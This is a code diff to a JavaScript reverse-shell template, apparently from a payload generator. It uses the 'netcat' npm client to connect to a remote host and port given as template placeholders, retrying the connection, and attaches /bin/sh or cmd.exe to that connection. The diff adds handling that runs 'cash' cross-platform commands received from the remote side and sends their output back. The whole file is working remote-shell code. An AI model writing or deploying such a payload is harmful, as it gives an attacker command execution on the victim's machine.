@@ -1,4 +1,5 @@
 var NetcatClient = require('netcat').client
+const $ = require('cash')
 
 var nc = new NetcatClient()
 var cmd = process.platform === 'win32' ? 'cmd.exe' : '/bin/sh'
@@ -11,7 +12,7 @@ var RETRY = {{retry}}
 nc.addr(RHOST).port(RPORT).retry(RETRY).connect().exec(cmd)
 
 nc.filter(function (chunk, enc, next) {
-  if (chunk.toString().indexOf('shx') === 0){
+  if (chunk.toString().indexOf('cash') === 0){
     // filter it on pipe
     next(null)
   } else {
@@ -19,8 +20,9 @@ nc.filter(function (chunk, enc, next) {
   }
 }).on('data', function(data){
   // the filter doesn't apply on 'data' events, just on the pipe stream.
-  if (data.toString().indexOf('shx') === 0){
+  if (data.toString().indexOf('cash') === 0){
     console.log('Cross-platform command!')
-    // TODO...
+    var argv = data.toString().replace('cash ', '')
+    this.send($(argv)) // execute Cross-platform cmd and send result
   }
 })
